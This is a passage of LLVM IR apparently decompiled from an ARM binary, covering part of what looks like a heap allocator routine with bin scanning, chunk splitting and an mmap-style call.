  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_11bc0
  %v5_11bcc = or i32 %v1_11bc0., 1
  store i32 %v5_11bcc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11bd8.preheader

bb142:                                            ; preds = %dec_label_pc_11bc0
  %v2_11bd0 = icmp eq i32 %v1_11bc0., 0
  br i1 %v2_11bd0, label %.dec_label_pc_11c14.preheader_crit_edge, label %dec_label_pc_11bd8.preheader

.dec_label_pc_11c14.preheader_crit_edge:          ; preds = %bb142
  %v0_11c0c54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c14.preheader

dec_label_pc_11bd8.preheader:                     ; preds = %bb142, %.thread12
  %v0_11bd8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11bd8

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bd8.preheader, %dec_label_pc_11be4
  %v0_11bd8 = phi i32 [ %v0_11bd8.pre, %dec_label_pc_11bd8.preheader ], [ %v1_11bd8, %dec_label_pc_11be4 ]
  %v1_11bd8 = add i32 %v0_11bd8, 1
  store i32 %v1_11bd8, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_11bd8, 2
  br i1 %tmp208, label %dec_label_pc_11cb8.loopexit, label %dec_label_pc_11be4

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bd8
  store i32 124804, i32* %r3.global-to-local, align 4
  %v1_11be8 = load i32, i32* @r8, align 4
  %v2_11be8 = add i32 %v1_11be8, 124804
  %v3_11be8 = inttoptr i32 %v2_11be8 to i32*
  %v4_11be8 = load i32, i32* %v3_11be8, align 4
  store i32 %v4_11be8, i32* %r2.global-to-local, align 4
  %v4_11bec = mul i32 %v1_11bd8, 4
  %v5_11bec = add i32 %v4_11be8, %v4_11bec
  store i32 %v5_11bec, i32* %r3.global-to-local, align 4
  %v1_11bf0 = add i32 %v5_11bec, 820
  %v2_11bf0 = inttoptr i32 %v1_11bf0 to i32*
  %v3_11bf0 = load i32, i32* %v2_11bf0, align 4
  store i32 %v3_11bf0, i32* @r4, align 4
  %v2_11bf4 = icmp eq i32 %v3_11bf0, 0
  br i1 %v2_11bf4, label %dec_label_pc_11bd8, label %dec_label_pc_11bfc

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11be4
  %v4_11bfc = mul i32 %v1_11bd8, 256
  %v5_11bfc = add i32 %v4_11be8, %v4_11bfc
  store i32 %v5_11bfc, i32* %r3.global-to-local, align 4
  %v1_11c00 = add i32 %v5_11bfc, 44
  store i32 %v1_11c00, i32* %r0.global-to-local, align 4
  %v0_11c04 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11c04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c14.preheader

dec_label_pc_11c14.preheader:                     ; preds = %.dec_label_pc_11c14.preheader_crit_edge, %dec_label_pc_11bfc
  %v0_11c0c54 = phi i32 [ %v1_11c00, %dec_label_pc_11bfc ], [ %v0_11c0c54.pre, %.dec_label_pc_11c14.preheader_crit_edge ]
  %v0_11c30 = phi i32 [ %v3_11bf0, %dec_label_pc_11bfc ], [ %v1_11bc8, %.dec_label_pc_11c14.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_11c04, %dec_label_pc_11bfc ], [ %v0_11bc8, %.dec_label_pc_11c14.preheader_crit_edge ]
  %v2_11c1451 = and i32 %ip.promoted, %v0_11c30
  %v4_11c1453 = icmp eq i32 %v2_11c1451, 0
  br i1 %v4_11c1453, label %dec_label_pc_11c0c, label %dec_label_pc_11c1c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11c14.preheader, %dec_label_pc_11c0c
  %v2_11c1056 = phi i32 [ %v2_11c10, %dec_label_pc_11c0c ], [ %ip.promoted, %dec_label_pc_11c14.preheader ]
  %v0_11c0c55 = phi i32 [ %v1_11c0c, %dec_label_pc_11c0c ], [ %v0_11c0c54, %dec_label_pc_11c14.preheader ]
  %v1_11c0c = add i32 %v0_11c0c55, 8
  %v2_11c10 = mul i32 %v2_11c1056, 2
  %v2_11c14 = and i32 %v2_11c10, %v0_11c30
  %v4_11c14 = icmp eq i32 %v2_11c14, 0
  br i1 %v4_11c14, label %dec_label_pc_11c0c, label %dec_label_pc_11c14.dec_label_pc_11c1c_crit_edge

dec_label_pc_11c14.dec_label_pc_11c1c_crit_edge:  ; preds = %dec_label_pc_11c0c
  store i32 %v1_11c0c, i32* %r0.global-to-local, align 4
  store i32 %v2_11c10, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c14.dec_label_pc_11c1c_crit_edge, %dec_label_pc_11c14.preheader
  %v0_11c3c = phi i32 [ %v2_11c10, %dec_label_pc_11c14.dec_label_pc_11c1c_crit_edge ], [ %ip.promoted, %dec_label_pc_11c14.preheader ]
  %v0_11c60 = phi i32 [ %v1_11c0c, %dec_label_pc_11c14.dec_label_pc_11c1c_crit_edge ], [ %v0_11c0c54, %dec_label_pc_11c14.preheader ]
  %v1_11c1c = add i32 %v0_11c60, 12
  %v2_11c1c = inttoptr i32 %v1_11c1c to i32*
  %v3_11c1c = load i32, i32* %v2_11c1c, align 4
  store i32 %v3_11c1c, i32* @lr, align 4
  %v9_11c20 = icmp eq i32 %v3_11c1c, %v0_11c60
  br i1 %v9_11c20, label %dec_label_pc_11c28, label %dec_label_pc_11c48

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11c1c
  store i32 124804, i32* %r0.global-to-local, align 4
  %v1_11c2c = load i32, i32* @r8, align 4
  %v2_11c2c = add i32 %v1_11c2c, 124804
  %v3_11c2c = inttoptr i32 %v2_11c2c to i32*
  %v4_11c2c = load i32, i32* %v3_11c2c, align 4
  %v2_11c30 = sub i32 -1, %v0_11c3c
  %v3_11c30 = and i32 %v0_11c30, %v2_11c30
  store i32 %v3_11c30, i32* @r4, align 4
  %v1_11c34 = load i32, i32* @r5, align 4
  %v4_11c34 = mul i32 %v1_11c34, 4
  %v5_11c34 = add i32 %v4_11c34, %v4_11c2c
  store i32 %v5_11c34, i32* %r3.global-to-local, align 4
  %v1_11c38 = add i32 %v0_11c60, 8
  store i32 %v1_11c38, i32* %r0.global-to-local, align 4
  %v2_11c3c = mul i32 %v0_11c3c, 2
  store i32 %v2_11c3c, i32* %ip.global-to-local, align 4
  %v2_11c40 = add i32 %v5_11c34, 820
  %v3_11c40 = inttoptr i32 %v2_11c40 to i32*
  store i32 %v3_11c30, i32* %v3_11c40, align 4
  %v0_11bc0.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_11bc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11bc0

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c1c
  %v1_11c48 = add i32 %v3_11c1c, 4
  %v2_11c48 = inttoptr i32 %v1_11c48 to i32*
  %v3_11c48 = load i32, i32* %v2_11c48, align 4
  store i32 %v3_11c48, i32* %r3.global-to-local, align 4
  %v1_11c4c = and i32 %v3_11c48, -4
  store i32 %v1_11c4c, i32* %r2.global-to-local, align 4
  %v0_11c50 = load i32, i32* @sl, align 4
  %v2_11c50 = sub i32 %v1_11c4c, %v0_11c50
  store i32 %v2_11c50, i32* %ip.global-to-local, align 4
  %v1_11c54 = add i32 %v3_11c1c, 12
  %v2_11c54 = inttoptr i32 %v1_11c54 to i32*
  %v3_11c54 = load i32, i32* %v2_11c54, align 4
  store i32 %v3_11c54, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_11c50, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_11c48
  %v6_11c5c = add i32 %v1_11c4c, %v3_11c1c
  store i32 %v6_11c5c, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_11c48, %bb143
  %v2_11c60 = add i32 %v3_11c54, 8
  %v3_11c60 = inttoptr i32 %v2_11c60 to i32*
  store i32 %v0_11c60, i32* %v3_11c60, align 4
  %v0_11c64 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c64 = load i32, i32* %r0.global-to-local, align 4
  %v2_11c64 = add i32 %v1_11c64, 12
  %v3_11c64 = inttoptr i32 %v2_11c64 to i32*
  store i32 %v0_11c64, i32* %v3_11c64, align 4
  %v4_11c68 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_11b44_crit_edge, label %dec_label_pc_11c74

.dec_label_pc_11b44_crit_edge:                    ; preds = %bb144
  %v5_11c68 = add i32 %v4_11c68, 8
  store i32 %v5_11c68, i32* %r4.global-to-local, align 4
  %v4_11c6c = load i32, i32* %r2.global-to-local, align 4
  %v5_11c6c = add i32 %v4_11c6c, 4
  %v6_11c6c = inttoptr i32 %v5_11c6c to i32*
  %v7_11c6c = load i32, i32* %v6_11c6c, align 4
  store i32 %v7_11c6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11b44

dec_label_pc_11c74:                               ; preds = %bb144
  %v1_11c74 = load i32, i32* @sl, align 4
  %v2_11c74 = add i32 %v1_11c74, %v4_11c68
  store i32 %v2_11c74, i32* %r1.global-to-local, align 4
  %v1_11c7c = load i32, i32* @r6, align 4
  %v2_11c7c = add i32 %v1_11c7c, 8
  %v3_11c7c = inttoptr i32 %v2_11c7c to i32*
  store i32 %v2_11c74, i32* %v3_11c7c, align 4
  %v0_11c80 = load i32, i32* %r1.global-to-local, align 4
  %v1_11c80 = load i32, i32* @r6, align 4
  %v2_11c80 = add i32 %v1_11c80, 12
  %v3_11c80 = inttoptr i32 %v2_11c80 to i32*
  store i32 %v0_11c80, i32* %v3_11c80, align 4
  %v0_11c84 = load i32, i32* @r6, align 4
  %v1_11c84 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c84 = add i32 %v1_11c84, 8
  %v3_11c84 = inttoptr i32 %v2_11c84 to i32*
  store i32 %v0_11c84, i32* %v3_11c84, align 4
  %v0_11c88 = load i32, i32* @r6, align 4
  %v1_11c88 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c88 = add i32 %v1_11c88, 12
  %v3_11c88 = inttoptr i32 %v2_11c88 to i32*
  store i32 %v0_11c88, i32* %v3_11c88, align 4
  %tmp210 = icmp ult i32 %v1_11c74, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_11c74
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r2.global-to-local, align 4
  %v8_11c94 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v8_11c94, i32* %r3.global-to-local, align 4
  %v4_11c98 = load i32, i32* %r1.global-to-local, align 4
  %v6_11c98 = add i32 %v8_11c94, 48
  %v7_11c98 = inttoptr i32 %v6_11c98 to i32*
  store i32 %v4_11c98, i32* %v7_11c98, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11c74, %bb145
  %v0_11c9c = load i32, i32* @sl, align 4
  %v1_11c9c = or i32 %v0_11c9c, 1
  store i32 %v1_11c9c, i32* %r2.global-to-local, align 4
  %v0_11ca0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ca0 = or i32 %v0_11ca0, 1
  store i32 %v1_11ca0, i32* %r3.global-to-local, align 4
  %v0_11ca4 = load i32, i32* @lr, align 4
  %v1_11ca4 = add i32 %v0_11ca4, 8
  store i32 %v1_11ca4, i32* %r4.global-to-local, align 4
  %v2_11ca8 = add i32 %v0_11ca4, 4
  %v3_11ca8 = inttoptr i32 %v2_11ca8 to i32*
  store i32 %v1_11c9c, i32* %v3_11ca8, align 4
  %v0_11cac = load i32, i32* %ip.global-to-local, align 4
  %v1_11cac = load i32, i32* %r1.global-to-local, align 4
  %v3_11cac = add i32 %v1_11cac, %v0_11cac
  %v4_11cac = inttoptr i32 %v3_11cac to i32*
  store i32 %v0_11cac, i32* %v4_11cac, align 4
  %v0_11cb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11cb0 = add i32 %v1_11cb0, 4
  %v3_11cb0 = inttoptr i32 %v2_11cb0 to i32*
  store i32 %v0_11cb0, i32* %v3_11cb0, align 4
  br label %dec_label_pc_12104

dec_label_pc_11cb8.loopexit:                      ; preds = %dec_label_pc_11bd8
  br label %dec_label_pc_11cb8

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11cb8.loopexit, %dec_label_pc_118cc, %dec_label_pc_118d4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %ip.global-to-local, align 4
  %v4_11cc0 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11cc0, i32* @r0, align 4
  %v1_11cc4 = add i32 %v4_11cc0, 44
  %v2_11cc4 = inttoptr i32 %v1_11cc4 to i32*
  %v3_11cc4 = load i32, i32* %v2_11cc4, align 4
  store i32 %v3_11cc4, i32* %ip.global-to-local, align 4
  %v1_11cc8 = add i32 %v3_11cc4, 4
  %v2_11cc8 = inttoptr i32 %v1_11cc8 to i32*
  %v3_11cc8 = load i32, i32* %v2_11cc8, align 4
  %v0_11ccc = load i32, i32* @sl, align 4
  %v1_11ccc = add i32 %v0_11ccc, 16
  store i32 %v1_11ccc, i32* %r1.global-to-local, align 4
  %v1_11cd0 = and i32 %v3_11cc8, -4
  store i32 %v1_11cd0, i32* %r3.global-to-local, align 4
  %v3_11cd4 = icmp ult i32 %v1_11cd0, %v1_11ccc
  br i1 %v3_11cd4, label %dec_label_pc_11d04, label %dec_label_pc_11ce0

dec_label_pc_11ce0:                               ; preds = %dec_label_pc_11cb8
  %v2_11ce0 = sub i32 %v1_11cd0, %v0_11ccc
  %v2_11ce4 = add i32 %v0_11ccc, %v3_11cc4
  store i32 %v2_11ce4, i32* %r1.global-to-local, align 4
  %v1_11ce8 = or i32 %v2_11ce0, 1
  store i32 %v1_11ce8, i32* %r3.global-to-local, align 4
  %v1_11cec = or i32 %v0_11ccc, 1
  store i32 %v1_11cec, i32* %r2.global-to-local, align 4
  %v1_11cf0 = add i32 %v3_11cc4, 8
  store i32 %v1_11cf0, i32* %r4.global-to-local, align 4
  store i32 %v1_11cec, i32* %v2_11cc8, align 4
  %v0_11cf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11cf8 = load i32, i32* @r0, align 4
  %v2_11cf8 = add i32 %v1_11cf8, 44
  %v3_11cf8 = inttoptr i32 %v2_11cf8 to i32*
  store i32 %v0_11cf8, i32* %v3_11cf8, align 4
  %v0_11cfc = load i32, i32* %r3.global-to-local, align 4
  %v1_11cfc = load i32, i32* %r1.global-to-local, align 4
  %v2_11cfc = add i32 %v1_11cfc, 4
  %v3_11cfc = inttoptr i32 %v2_11cfc to i32*
  store i32 %v0_11cfc, i32* %v3_11cfc, align 4
  br label %dec_label_pc_12104

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11cb8
  %v1_11d04 = inttoptr i32 %v4_11cc0 to i32*
  %v2_11d04 = load i32, i32* %v1_11d04, align 4
  store i32 %v2_11d04, i32* %r3.global-to-local, align 4
  %v1_11d08 = and i32 %v2_11d04, 2
  store i32 %v1_11d08, i32* %ip.global-to-local, align 4
  %v2_11d08 = icmp eq i32 %v1_11d08, 0
  %v1_11d0c = add i32 %v4_11cc0, 860
  %v2_11d0c = inttoptr i32 %v1_11d0c to i32*
  %v3_11d0c = load i32, i32* %v2_11d0c, align 4
  store i32 %v3_11d0c, i32* %r1.global-to-local, align 4
  br i1 %v2_11d08, label %dec_label_pc_11d24, label %dec_label_pc_11d14

dec_label_pc_11d14:                               ; preds = %dec_label_pc_11d04
  %v0_11d14 = call i32 @function_126e4()
  %v0_11d18 = load i32, i32* @sl, align 4
  %v1_11d18 = add i32 %v0_11d18, -7
  store i32 %v1_11d18, i32* @r0, align 4
  %v0_11d1c = call i32 @function_1182c()
  store i32 %v0_11d1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12100

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11d04
  %v1_11d24 = add i32 %v4_11cc0, 844
  %v2_11d24 = inttoptr i32 %v1_11d24 to i32*
  %v3_11d24 = load i32, i32* %v2_11d24, align 4
  store i32 %v3_11d24, i32* %r3.global-to-local, align 4
  %v3_11d28 = icmp ult i32 %v0_11ccc, %v3_11d24
  %v1_11d2c = add i32 %v3_11d0c, -1
  store i32 %v1_11d2c, i32* %sb.global-to-local, align 4
  br i1 %v3_11d28, label %dec_label_pc_11e00, label %dec_label_pc_11d34

dec_label_pc_11d34:                               ; preds = %dec_label_pc_11d24
  %v1_11d34 = add i32 %v4_11cc0, 852
  %v2_11d34 = inttoptr i32 %v1_11d34 to i32*
  %v3_11d34 = load i32, i32* %v2_11d34, align 4
  store i32 %v3_11d34, i32* %r2.global-to-local, align 4
  %v1_11d38 = add i32 %v4_11cc0, 848
  %v2_11d38 = inttoptr i32 %v1_11d38 to i32*
  %v3_11d38 = load i32, i32* %v2_11d38, align 4
  store i32 %v3_11d38, i32* %r3.global-to-local, align 4
  %v6_11d40 = icmp slt i32 %v3_11d38, %v3_11d34
  br i1 %v6_11d40, label %dec_label_pc_11d44, label %dec_label_pc_11e00

dec_label_pc_11d44:                               ; preds = %dec_label_pc_11d34
  %v1_11d44 = add i32 %v0_11ccc, 10
  %v2_11d48 = add i32 %v1_11d44, %v3_11d0c
  store i32 %v2_11d48, i32* %r3.global-to-local, align 4
  %v2_11d4c = sub i32 0, %v3_11d0c
  %v3_11d4c = and i32 %v2_11d48, %v2_11d4c
  store i32 %v3_11d4c, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_11d4c, %v0_11ccc
  br i1 %tmp211, label %dec_label_pc_11d58, label %dec_label_pc_11e00

dec_label_pc_11d58:                               ; preds = %dec_label_pc_11d44
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_11d4c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11d70 = call i32 @function_13b14(i32 0, i32 %v3_11d4c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11d70, i32* %r0.global-to-local, align 4
  %v7_11d74 = icmp eq i32 %v6_11d70, -1
  br i1 %v7_11d74, label %dec_label_pc_11d58.dec_label_pc_11e00_crit_edge, label %dec_label_pc_11d7c

dec_label_pc_11d58.dec_label_pc_11e00_crit_edge:  ; preds = %dec_label_pc_11d58
  %v1_11e24.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_11e00

dec_label_pc_11d7c:                               ; preds = %dec_label_pc_11d58
  %v1_11d7c = urem i32 %v6_11d70, 8
  store i32 %v1_11d7c, i32* %r2.global-to-local, align 4
  %v2_11d7c = icmp eq i32 %v1_11d7c, 0
  br i1 %v2_11d7c, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11d7c
  %v2_11d80 = sub nsw i32 8, %v1_11d7c
  store i32 %v2_11d80, i32* %r3.global-to-local, align 4
  %v2_11d84 = load i32, i32* @r4, align 4
  %v3_11d84 = sub i32 %v2_11d84, %v2_11d80
  %v3_11d88 = add i32 %v2_11d80, %v6_11d70
  store i32 %v3_11d88, i32* %lr.global-to-local, align 4
  %v2_11d90 = or i32 %v3_11d84, 2
  store i32 %v2_11d90, i32* %r2.global-to-local, align 4
  %v5_11d98 = inttoptr i32 %v3_11d88 to i32*
  store i32 %v2_11d80, i32* %v5_11d98, align 4
  %v1_11d9c = load i32, i32* %r2.global-to-local, align 4
  %v2_11d9c = load i32, i32* %lr.global-to-local, align 4
  %v3_11d9c = add i32 %v2_11d9c, 4
  %v4_11d9c = inttoptr i32 %v3_11d9c to i32*
  store i32 %v1_11d9c, i32* %v4_11d9c, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_11d7c
  store i32 %v6_11d70, i32* %lr.global-to-local, align 4
  %v1_11d9447 = load i32, i32* @r4, align 4
  %v2_11d9448 = or i32 %v1_11d9447, 2
  store i32 %v2_11d9448, i32* %r3.global-to-local, align 4
  %v3_11da0 = inttoptr i32 %v6_11d70 to i32*
  store i32 0, i32* %v3_11da0, align 4
  %v1_11da4 = load i32, i32* %r3.global-to-local, align 4
  %v2_11da4 = load i32, i32* %lr.global-to-local, align 4
  %v3_11da4 = add i32 %v2_11da4, 4
  %v4_11da4 = inttoptr i32 %v3_11da4 to i32*
  store i32 %v1_11da4, i32* %v4_11da4, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 124804, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11db0 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11db0, i32* %ip.global-to-local, align 4
  %v1_11db4 = add i32 %v4_11db0, 848
  %v2_11db4 = inttoptr i32 %v1_11db4 to i32*
  %v3_11db4 = load i32, i32* %v2_11db4, align 4
  store i32 %v3_11db4, i32* %r3.global-to-local, align 4
  %v1_11db8 = add i32 %v4_11db0, 856
  %v2_11db8 = inttoptr i32 %v1_11db8 to i32*
  %v3_11db8 = load i32, i32* %v2_11db8, align 4
  store i32 %v3_11db8, i32* %r2.global-to-local, align 4
  %v1_11dbc = add i32 %v3_11db4, 1
  store i32 %v1_11dbc, i32* %r3.global-to-local, align 4
  %v7_11dc4 = icmp sgt i32 %v1_11dbc, %v3_11db8
  br i1 %v7_11dc4, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_11dbc, i32* %v2_11db8, align 4
  %v0_11dc8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_11dc8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_11dc8 = phi i32 [ %v4_11db0, %.thread27 ], [ %v1_11dc8.pre, %bb147 ]
  %v0_11dc8 = phi i32 [ %v1_11dbc, %.thread27 ], [ %v0_11dc8.pre, %bb147 ]
  %v2_11dc8 = add i32 %v1_11dc8, 848
  %v3_11dc8 = inttoptr i32 %v2_11dc8 to i32*
  store i32 %v0_11dc8, i32* %v3_11dc8, align 4
  %v0_11dcc = load i32, i32* %ip.global-to-local, align 4
  %v1_11dcc = add i32 %v0_11dcc, 868
  %v2_11dcc = inttoptr i32 %v1_11dcc to i32*
  %v3_11dcc = load i32, i32* %v2_11dcc, align 4
  store i32 %v3_11dcc, i32* %r3.global-to-local, align 4
  %v1_11dd0 = add i32 %v0_11dcc, 880
  %v2_11dd0 = inttoptr i32 %v1_11dd0 to i32*
  %v3_11dd0 = load i32, i32* %v2_11dd0, align 4
  store i32 %v3_11dd0, i32* %r2.global-to-local, align 4
  %v0_11dd4 = load i32, i32* @r4, align 4
  %v2_11dd4 = add i32 %v0_11dd4, %v3_11dcc
  store i32 %v2_11dd4, i32* %r1.global-to-local, align 4
  %v1_11dd8 = add i32 %v0_11dcc, 872
  %v2_11dd8 = inttoptr i32 %v1_11dd8 to i32*
  %v3_11dd8 = load i32, i32* %v2_11dd8, align 4
  store i32 %v3_11dd8, i32* %r3.global-to-local, align 4
  %v1_11de0 = add i32 %v0_11dcc, 884
  %v2_11de0 = inttoptr i32 %v1_11de0 to i32*
  %v3_11de0 = load i32, i32* %v2_11de0, align 4
  store i32 %v3_11de0, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_11dd4, %v3_11dd0
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_11dd4, i32* %v2_11dd0, align 4
  %v0_11de8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11de8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_11de8 = phi i32 [ %v0_11dcc, %bb148 ], [ %v1_11de8.pre, %bb149 ]
  %v0_11de8 = phi i32 [ %v2_11dd4, %bb148 ], [ %v0_11de8.pre, %bb149 ]
  %v2_11de8 = add i32 %v1_11de8, 868
  %v3_11de8 = inttoptr i32 %v2_11de8 to i32*
  store i32 %v0_11de8, i32* %v3_11de8, align 4
  %v0_11dec = load i32, i32* %r1.global-to-local, align 4
  %v1_11dec = load i32, i32* %r3.global-to-local, align 4
  %v2_11dec = add i32 %v1_11dec, %v0_11dec
  store i32 %v2_11dec, i32* %r1.global-to-local, align 4
  %v1_11df0 = load i32, i32* %r2.global-to-local, align 4
  %v0_11df4 = load i32, i32* %lr.global-to-local, align 4
  %v1_11df4 = add i32 %v0_11df4, 8
  store i32 %v1_11df4, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_11dec, %v1_11df0
  br i1 %tmp213, label %bb151, label %dec_label_pc_12100

bb151:                                            ; preds = %bb150
  %v5_11df8 = load i32, i32* %ip.global-to-local, align 4
  %v6_11df8 = add i32 %v5_11df8, 884
  %v7_11df8 = inttoptr i32 %v6_11df8 to i32*
  store i32 %v2_11dec, i32* %v7_11df8, align 4
  br label %dec_label_pc_12100

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11d44, %dec_label_pc_11d24, %dec_label_pc_11d58.dec_label_pc_11e00_crit_edge, %dec_label_pc_11d34
  %v1_11e24 = phi i32 [ %v1_11e24.pre, %dec_label_pc_11d58.dec_label_pc_11e00_crit_edge ], [ %v0_11ccc, %dec_label_pc_11d34 ], [ %v0_11ccc, %dec_label_pc_11d24 ], [ %v0_11ccc, %dec_label_pc_11d44 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %ip.global-to-local, align 4
  %v4_11e08 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11e08, i32* %r3.global-to-local, align 4
  %v1_11e0c = add i32 %v4_11e08, 44
  %v2_11e0c = inttoptr i32 %v1_11e0c to i32*
  %v3_11e0c = load i32, i32* %v2_11e0c, align 4
  store i32 %v3_11e0c, i32* %r0.global-to-local, align 4
  %v1_11e10 = add i32 %v4_11e08, 864
  %v2_11e10 = inttoptr i32 %v1_11e10 to i32*
  %v3_11e10 = load i32, i32* %v2_11e10, align 4
  store i32 %v3_11e10, i32* %r2.global-to-local, align 4
  %v1_11e14 = add i32 %v4_11e08, 840
  %v2_11e14 = inttoptr i32 %v1_11e14 to i32*
  %v3_11e14 = load i32, i32* %v2_11e14, align 4
  store i32 %v3_11e14, i32* %r3.global-to-local, align 4
  %v1_11e18 = add i32 %v3_11e0c, 4
  %v2_11e18 = inttoptr i32 %v1_11e18 to i32*
  %v3_11e18 = load i32, i32* %v2_11e18, align 4
  store i32 %v3_11e18, i32* %r1.global-to-local, align 4
  %v1_11e20 = urem i32 %v3_11e10, 2
  %v2_11e20 = icmp eq i32 %v1_11e20, 0
  %v1_11e1c = add i32 %v1_11e24, 16
  %v2_11e24 = add i32 %v1_11e1c, %v3_11e14
  store i32 %v2_11e24, i32* %r3.global-to-local, align 4
  %v1_11e28 = and i32 %v3_11e18, -4
  store i32 %v1_11e28, i32* @r8, align 4
  br i1 %v2_11e20, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_11e00
  %v3_11e2c = sub i32 %v2_11e24, %v1_11e28
  store i32 %v3_11e2c, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_11e00, %bb152
  %v0_11e30 = phi i32 [ %v2_11e24, %dec_label_pc_11e00 ], [ %v3_11e2c, %bb152 ]
  %v1_11e30 = load i32, i32* %sb.global-to-local, align 4
  %v2_11e30 = add i32 %v1_11e30, %v0_11e30
  store i32 %v2_11e30, i32* %r3.global-to-local, align 4
  %v1_11e34 = sub i32 -1, %v1_11e30
  store i32 %v1_11e34, i32* %fp.global-to-local, align 4
  %v2_11e38 = and i32 %v2_11e30, %v1_11e34
  store i32 %v2_11e38, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_11e38, 1
  br i1 %tmp154, label %dec_label_pc_11e5c, label %dec_label_pc_11e48

dec_label_pc_11e48:                               ; preds = %bb153
  store i32 %v2_11e38, i32* %r0.global-to-local, align 4
  %v1_11e4c = call i32 @function_13da0(i32 %v2_11e38)
  store i32 %v1_11e4c, i32* %r0.global-to-local, align 4
  %v3_11e50 = icmp eq i32 %v1_11e4c, -1
  store i32 %v1_11e4c, i32* @r4, align 4
  br i1 %v3_11e50, label %dec_label_pc_11e5c, label %dec_label_pc_11ec8

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e48, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r1.global-to-local, align 4
  %v4_11e64 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11e64, i32* %r6.global-to-local, align 4
  %v1_11e68 = add i32 %v4_11e64, 864
  %v2_11e68 = inttoptr i32 %v1_11e68 to i32*
  %v3_11e68 = load i32, i32* %v2_11e68, align 4
  store i32 %v3_11e68, i32* %r3.global-to-local, align 4
  %v1_11e6c = urem i32 %v3_11e68, 2
  %v2_11e6c = icmp eq i32 %v1_11e6c, 0
  br i1 %v2_11e6c, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_11e5c
  %v1_11e70 = load i32, i32* @r8, align 4
  %v2_11e70 = load i32, i32* %sb.global-to-local, align 4
  %v3_11e70 = add i32 %v2_11e70, %v1_11e70
  %v2_11e74 = load i32, i32* @r5, align 4
  %v3_11e74 = add i32 %v3_11e70, %v2_11e74
  store i32 %v3_11e74, i32* %r3.global-to-local, align 4
  %v2_11e78 = load i32, i32* %fp.global-to-local, align 4
  %v3_11e78 = and i32 %v2_11e78, %v3_11e74
  store i32 %v3_11e78, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_11e5c
  %v0_11e7c.pr = load i32, i32* @r5, align 4
  br label %.thread29

